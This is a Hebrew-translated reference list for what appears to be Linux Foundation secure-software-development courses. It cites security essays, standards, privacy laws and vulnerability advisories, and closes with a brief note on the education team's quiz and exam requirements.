Scanlon, Thomas*, 10 סוגים של כלי בדיקת אבטחת יישומים: מתי וכיצד להשתמש בהם*, בלוג המכון להנדסת תוכנה (SEI), 2018-07-09 ([https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html))

שנייר, ברוס*, אני על הפרת Equifax: עדות והצהרה לרקורד של ברוס שנייר*, שימוע בנושא "אבטחת נתוני אשראי של צרכנים בעידן המסחר הדיגיטלי" בפני ועדת המשנה למסחר דיגיטלי והגנת הצרכן, הוועדה לאנרגיה ומסחר, בית הנבחרים של ארצות הברית, 2017-11-01 ([https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html))

שנייר, ברוס*, תהליך הביטחון*, 2000 ([https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html))

שנייר, ברוס, *הלך הרוח הביטחוני*, 2008-03 ([https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html](https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html))

שנייר, ברוס*, בתוך מוחו המעוות של מומחה האבטחה, *Wired, 2008-03-20, [https://www.schneier.com/essays/archives/2008/03/inside_the_twisted_m.html](https://www.schneier.com/essays/archives/2008/03/inside_the_twisted_m.html)

אתר אינטרנט של כותרות אבטחה לבדיקת כותרות באתרים נגישים לציבור ([https://securityheaders.com/](https://securityheaders.com/))

אבטחה.txt ([https://securitytxt.org/](https://securitytxt.org/))

מעבדות סנטינל, "CVE-2021-45608 | פגם NetUSB RCE במיליוני נתבים של משתמשי קצה" ([https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/](https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/))

שאהין, מוג'תבא; באר, מוחמד עלי; Zhu, Liming*, אינטגרציה מתמשכת, אספקה ופריסה: סקירה שיטתית על גישות, כלים, אתגרים ופרקטיקות, *גישה ל-IEEE, 2017 ([https://arxiv.org/abs/1703.07019](https://arxiv.org/abs/1703.07019))

שבצ'נקו, נטליה, *מידול איומים: 12 שיטות זמינות*, 2018 ([https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html))

שו, שיאוקוי; סימברון, אנדרו; יאו, דנפנג*, שבירת היעד: ניתוח של דליפת נתוני יעד והפקת לקחים*, 2017-01-18 ([https://arxiv.org/pdf/1701.04940.pdf](https://arxiv.org/pdf/1701.04940.pdf))

סים, דארן, *פגיעות אבטחה והשפעת ביצועי הדפדפן של Target="_blank", *2019-03-23 ([https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547))

סינג, אנימש, אנופמה מורת'י וכריסטיאן קדנר,
[שלב התקפות יריבות בצנרת אימון מודלים](https://developer.ibm.com/patterns/integrate-adversarial-attacks-model-training-pipeline/),
2018-06-25

גילוי SSD, ייעוץ SSD – פגיעויות VestaCP LPE, 2021-03-20, (<https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/>)

מדינת קליפורניה, *חוק הגנת הפרטיות המקוונת של קליפורניה (OPPA), *2003 ([https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575))

מדינת קליפורניה, *חוק הגנת הפרטיות המקוונת של קליפורניה (OPPA), פרק 22. דרישות פרטיות באינטרנט [22575-22579]*, 2003 ([https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575))

מדינת קליפורניה, *חוק פרטיות הצרכן בקליפורניה (CCPA), *2018 ([https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5](https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5))

סטילגריאן*, הסתמכות על באגים 'לא ניהול סיכונים מתאים': קייטי מוסוריס*, 2019 ([https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/](https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/))

 *שרשור מהיר ואופציונלי* ([https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html](https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html))

טבאסי, אלהאם (NIST), קווין ברנס (MITRE), מייקל הדג'ימייקל (MITRE), אנדרס מולינה-מרקהם (MITRE), ג'וליאן סקסטון (MITRE),
טקסונומיה וטרמינולוגיה של למידת מכונה יריבה
ניסטיר 8269 (טיוטה),
אוקטובר 2019<https://csrc.nist.gov/publications/detail/nistir/8269/draft>

פרויקט הערפול ([https://fuzzing-project.org/](https://fuzzing-project.org/))

קרן לינוקס*, סיכום מושגי GDPR לפרויקטים של תוכנה חופשית וקוד פתוח*, 2018 ([https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf))

קרן לינוקס, *מדיניות איסוף ושימוש בנתוני טלמטריה*, 2019 ([https://www.linuxfoundation.org/telemetry-data-policy/](https://www.linuxfoundation.org/telemetry-data-policy/))

הקבוצה הפתוחה*, תקן PO SIX - הגדרת משתנה הסביבה*, 2018 ([https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html](https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html))

תומס, "מיתוסים על /dev/urandom", (<https://www.2uo.de/myths-about-urandom>)

שובל של ביטים, *ברצינות, להפסיק להשתמש RSA,* 2019 ([https://blog.trailofbits.com/2019/07/08/fuck-rsa/](https://blog.trailofbits.com/2019/07/08/fuck-rsa/))

האומות המאוחדות*, האמנה הבינלאומית בדבר זכויות אזרחיות ומדיניות, סעיף 17, *1966 ([https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx](https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx))

משרד סגן עוזר מזכיר ההגנה של ארה"ב להנדסת מערכות (OASD SE), *מדריך לניהול סיכונים, סוגיות והזדמנויות לתוכניות רכש ביטחוניות*, 2017-01 ([http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf](http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf))

המכון הלאומי לתקנים וטכנולוגיה של ארה"ב (NIST) מסגרת אבטחת סייבר ([https://www.nist.gov/cyberframework](https://www.nist.gov/cyberframework))

המכון הלאומי לתקנים וטכנולוגיה של ארה"ב (NIST), מסד הנתונים הלאומי לפגיעות (NVD) ([https://nvd.nist.gov/](https://nvd.nist.gov/))

*חוק הפרטיות של ארה"ב משנת 1974 (5 U.S.C. 552a*)  ([https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf](https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf))

VeraCode*, DAST TEST: היתרונות של בדיקת DAST לאבטחת יישומים*, 2020 ([https://www.veracode.com/security/dast-test](https://www.veracode.com/security/dast-test))

WHATWG להביא מפרט ([https://fetch.spec.whatwg.org/#http-extensions](https://fetch.spec.whatwg.org/#http-extensions))

וילר, דוד א.*, תבנית מקרה אבטחת אבטחה לדוגמה, *נייר IDA P-9278, 2018-12 ([https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx))

וילר, דיוויד א., *תג שיטות עבודה מומלצות של יוזמת תשתית הליבה (CII) ב-2019, 2019-03-14 (*[https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf](https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf))

וילר, דוד א., *כיצד למנוע את דימום הלב הבא*, 2020-07-18 ([https://dwheeler.com/essays/heartbleed.html](https://dwheeler.com/essays/heartbleed.html))

וילר, דיוויד א.*, פגיעות הכישלון של אפל גוטו: לקחים שנלמדו*, 2020-08-13 ([https://dwheeler.com/essays/apple-goto-fail.html](https://dwheeler.com/essays/apple-goto-fail.html))

וילר, דיוויד א., "מניעת התקפות שרשרת אספקה כמו SolarWinds", *בלוג קרן לינוקס, *2021-01-13, (<https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/>)

# דרישות צוות חינוך

צוות החינוך של LF צריך:

1. סקירה כללית של כל פרק בכל אחד משלושת הקורסים יחד עם מטרות הלמידה {זה כבר נעשה לעיל; ראה את הטקסט אחרי כל "כותרת 1")

2. חידונים מדורגים בסוף הפרק: 3-6 שאלות, רצוי בסגנון רב ברירה

3. בחינת גמר לכל אחד משלושת הקורסים: 15 שאלות, רצוי רב ברירה, שונות מאלו שבחני סוף הפרק.

פריטים 2 ו-3 מכוסים בתיק נפרד, כדי להגן על סודיותם.

